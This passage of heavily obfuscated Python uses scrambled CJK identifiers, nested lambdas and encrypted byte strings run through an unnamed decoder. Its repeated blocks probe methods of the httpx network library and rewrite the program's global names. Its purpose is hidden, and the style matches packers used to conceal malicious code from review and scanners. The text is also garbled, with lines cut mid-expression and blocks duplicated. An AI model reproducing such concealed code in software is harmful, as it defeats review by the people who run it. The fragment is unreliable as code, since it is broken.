樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '闹嚑檯侈牂椙' == '勈牡遢泔樱畵':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            覲笉缿謼惩貇 = [[True], [False]]
            暽掇財豥硿淳(['舍櫝泩橢巷嵘'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 袮遇祝繞溿秩:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                闞挆卤惮螭祙 = [[(lambda: (lambda 蒑鑈敗鸫卙唨: 蒑鑈敗鸫卙唨 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 釂缲浕稝鬵笣: 釂缲浕稝鬵笣 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 饄癿鐣匝綷端:
        try:
            pass
        except:
            pass
        finally:
            pass

try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx').head
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()

try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx').put
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx').main
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()

try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx').delete
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx').options
        except AttributeError:
